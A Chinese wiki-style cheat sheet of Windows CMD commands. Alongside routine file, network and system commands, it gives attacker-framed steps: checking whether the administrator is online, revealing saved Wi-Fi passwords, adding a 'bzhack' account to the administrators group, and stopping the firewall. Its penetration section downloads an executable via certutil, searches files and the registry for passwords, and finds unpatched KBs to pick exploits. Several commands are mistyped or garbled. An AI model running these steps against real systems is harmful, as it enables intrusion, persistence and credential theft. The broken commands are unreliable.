---
layout: wiki
title: Windows CMD 命令大全
categories: CMD
description: Windows CMD命令整理大全
keywords: Windows,CMD
---

> cmd是command的缩写.即命令提示符（cmd），是在OS / 2 ， Windows CE与Windows NT平台为基础的操作系统下的“MS-DOS 方式”。中文版Windows XP 中的命令提示符进一步提高了与DOS 下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件，进入win10系统版本后部分命令可能出现失效的情况，同时微软也有意用Windows PowerShell代替传统的cmd命令提示符工具。

### 0x00  cmd常用命令

#### 0x00.0  常用命令


```shell
文件校验命令：
C:\Users\1\Desktop>  certutil -hashfile test  MD5
C:\Users\1\Desktop>  certutil -hashfile test SHA1
C:\Users\1\Desktop>  certutil -hashfile test SHA256
网络配置情况：
C:\Users\1\Desktop>  ipconfig  /all
查看本地DNS缓存：
C:\Users\1\Desktop>  ipconfig  /displaydns
查看连接过的wifi名：
C:\Users\1\Desktop>  netsh wlan show profile
获取wifi对应的的密码：
C:\Users\1\Desktop>  netsh wlan show profile WiFi-name key-clear
查当前机器中正在线的用户，看管理员在不在：
C:\Users\1\Desktop>  query user
示域列表/计算机列表：
C:\Users\1\Desktop>  net view
查看当前所有账号，判断域规模：
C:\Users\1\Desktop>  net user
查看当前域所有的组名：
C:\Users\1\Desktop>  net group
增加用户：
C:\Users\1\Desktop>  net user bzhack pass  /add
删除用户：
C:\Users\1\Desktop>  net user bzhack  /del
加、显示本地组：
C:\Users\1\Desktop>  net Localgroup
将bzhack加入管理员组：
C:\Users\1\Desktop>  net localgroup administrators bzhack  /add
查看当前机器开启的共享：
C:\Users\1\Desktop>  net share
```

#### 0x00.1  文件操作

```shell
建文件夹
C:\Users\1\Desktop>  md  a
删除文件夹
C:\Users\1\Desktop>  rd  a
示文件夹结构
C:\Users\1\Desktop>  tree
显示磁盘目录内容
C:\Users\1\Desktop>  dir
复制文件
C:\Users\1\Desktop>  copy
copy增强版，复制文件夹
C:\Users\1\Desktop>  xcop
删除文件
C:\Users\1\Desktop>  del
原文件  /夹名  [新文件/夹名]  修改文件名
C:\Users\1\Desktop>  ren
查看文本内容
C:\Users\1\Desktop>  type
搜索d盘里conf结尾的文件
C:\Users\1\Desktop>  dir /a/s/b d:"*.conf"
文本编辑
C:\Users\1\Desktop>  edit
显示文件内容
C:\Users\1\Desktop>  type
```

#### 0x00.2  网络命令

``` shell
列出所有端口
C:\Users\1\Desktop>  netstat -a
示PID和进程名称
C:\Users\1\Desktop>  netstat -p
显示核心路由信息
C:\Users\1\Desktop>  netstat -r
列出所有tcp连接
C:\Users\1\Desktop>  netstat -at
列出所有ucp连接
C:\Users\1\Desktop>  netstat -au
查看开启3389端口的信息
C:\Users\1\Desktop>  netstat -an | find  "3389"
查看当前正处于连接状态的端口及ip
C:\Users\1\Desktop>  netstat -ano | findstr "ESTABLISHED"
查看当前正处于监听状态的端口及ip
C:\Users\1\Desktop>  netstat -ano | findstr "LISTENING"
```

#### 0x00.3  其他命令

```shell
查看版本
C:\Users\1\Desktop>  ver
查看机器名
C:\Users\1\Desktop>  hostname
查看权限
C:\Users\1\Desktop>  whoami
查看配置
C:\Users\1\Desktop>  systeminfo
查看进程
C:\Users\1\Desktop>  tasklist
清屏
C:\Users\1\Desktop>  cls
查看开启的服务，比如Terminal Services远程连接服务
C:\Users\1\Desktop>  C:\Users\1\Desktop>  net start
闭防火墙
net stop sharedaccess
查看当前机器的环境变量，看有没有我们可以直接利用到的语言环境
C:\Users\1\Desktop>  set
列出当前机器上的所有盘符
C:\Users\1\Desktop>  fsutil fsinfo drives
```

### 0x01 渗透命令

- certutil——从远处URL下载文件

  ```shell
  C:\Users\1\Desktop>  certutil -urlcache -split -f http://baidu.com/test.exe
  ```

- findrst----查找文件后缀结果

  ```SHELL
  C:\Users\1\Desktop>  findstr/s/i"pass"*.py*
  C:\Users\1\Desktop>  reg query HKLM/f password/t REG_SZ 5----搜集注册表中的各种密码数据
  ```

- 查看有没有开启远程链接，运行下面命令：

  ```shell
  C:\Users\1\Desktop>  reg query "HKEY LOCAL_MACHINE\SYSTEM\CurrentC ontrolSet\Control\T erminal Server"/v fDenyTSConnections
  ```

  - 结果：1表示关闭，0表示开启

- 快速查找未打补丁的exp

  ```shell
  C:\Users\1\Desktop>  systeminfo > bzhack. txt&(for %i in (KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780) do @ type bzhack. txtl@ find /i "% ill @ echo %i you can exp)& del /f /q /a bzhack. txt
  ```
